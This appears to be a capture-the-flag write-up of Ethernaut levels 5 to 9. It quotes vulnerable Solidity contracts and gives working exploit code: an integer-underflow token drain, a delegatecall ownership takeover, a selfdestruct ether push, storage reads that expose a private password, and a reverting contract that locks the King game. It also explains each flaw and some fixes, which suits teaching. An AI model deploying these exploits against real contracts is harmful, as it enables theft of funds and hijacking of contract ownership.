# Ethernaut game solution

## 5. Token

```
The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

  Things that might help:

What is an odometer?

Sources
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

```

### Solution
The contract assigns us 20 initial tokens when initializing the constructor but we are asked to get more than that. 
The problem in the code is that the statement that checks if the sender has the balance that is trying to send is not safe for underflow. Since the balance and also the sent `_value` are uints, the substraction will be a uint as well. This is vulnerable to underflow, any substraction that results in a negative value, will underflow and so it will be positive making `_value >= 0` to be true.

So if we call the `transfer` from a contract that has 0 balance and pass `_value` > 0, the `require` won't fail and that amount will be transfer to the `_to` address.
Let's create a contract that calls the `transfer` and sends the tokens to the wallet playing the game.

```
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}

contract TokenHack {
    function hack(uint amount) public {
        Token token = Token(0xd5ECB40D16108e56E79dD76cd91e443743E855C8); // Ethernaut deployed Token contract
        token.transfer(0xe79252E06591B58E5865115faC30CE6926D8eF40, amount); // put the address playing the game here
    }
}
```
`TokenHack` basically calls the transfer with the amount passed and sends the amount to our wallet. Call `transfer` and send `21` tokens, that will result in a total of `41` tokens to your balance.
To fix this vunerability in the code, it's easier to use the SafeMath library, that provides the overflow checks under the hood.
E.g: `a = a.add(c);`

## 6. Delegation

```
The goal of this level is for you to claim ownership of the instance you are given.

  Things that might help

    Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
    Fallback methods
    Method ids
Sources

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

```

### Solution
Inside it's fallback, the `Delegation` contract delegates the call to it's `delegate`. That means that the delegate will have control over the `Delegation` state, preserving the `msg.sender` and `msg.value`.
So when we call the fallback, it will execute `Delegate`'s code. So we need to pass the `encodeFunctionSignature` as the `msg.data` so we trigger the `pwn` function and change the `Delegation`'s `owner`. 


```
let payload = web3.eth.abi.encodeFunctionSignature({
    name: 'pwn',
    type: 'function',
    inputs: []
});

await contract.sendTransaction({
    data: payload
});
```

## 7. Force

```
Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

Sources

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

```

### Solution

We're asked to force the contract to accept money. If it has a `revert` in the receive or in the fallback method, it will automaticaly reject our ether. One way to bypass that kind of check is to selfdestruct one contract and that will send the money to the address that we want, forcing it to recieve the ether.

```
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract Attack {
    constructor(address victim) payable {
        address payable payableVictime = payable(victim);
        selfdestruct(payableVictime);
    }
}
```
The lesson here is that there no way to reject the ether from a contract that is self destroying itself so don't rely on `address(this).balance == 0` for any of the logic inside your contracts.

## 8. Vault

```
Unlock the vault to pass the level!
Sources

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}


```

Everything in the blockchain is public, even the private variables. We can use `web3.eth.getStorageAt` to get the contract's internal memory state at the position that we want.
In this case, the first position will be used by `locked`, which is a boolean. 
```
await web3.eth.getStorageAt('0x1c928492c8b0E2326270C5E05A7dBcB96aB124ED', 0)
"0x0000000000000000000000000000000000000000000000000000000000000001"
```
Since the Vault is locked, the value is 1.
Now, let's look at the position `1` to get the value of the `password`:
```
await web3.eth.getStorageAt('0x1c928492c8b0E2326270C5E05A7dBcB96aB124ED', 1)
"0x412076657279207374726f6e67207365637265742070617373776f7264203a29"
web3.utils.hexToString('0x412076657279207374726f6e67207365637265742070617373776f7264203a29')
"A very strong secret password :)"
```

That's the password as a string, but we need to send the hex to unlock, so let's do it:
```
await contract.unlock(web3.eth.getStorageAt('0x1c928492c8b0E2326270C5E05A7dBcB96aB124ED', 1))
```

After unlocking:
```
await web3.eth.getStorageAt('0x1c928492c8b0E2326270C5E05A7dBcB96aB124ED', 0)
"0x0000000000000000000000000000000000000000000000000000000000000000"
```

## 9. King

```
King
Difficulty 6/10

The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD

Such a fun game. Your goal is to break it.

When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

Sources
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

```
### Solution

The vulnerability that is exposed in the contract is in transfer step: `king.transfer(msg.value);`. If we get the throne then we can basically revert any transfer call and so we can be Kings forever.

```
// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract King {
    constructor(address payable kingdomAddress) payable {
        address(kingdomAddress).call{gas: 1000000, value: 1 ether}("");
    }
    receive() external payable {
        revert('I want to be the king!');
    }
}

```
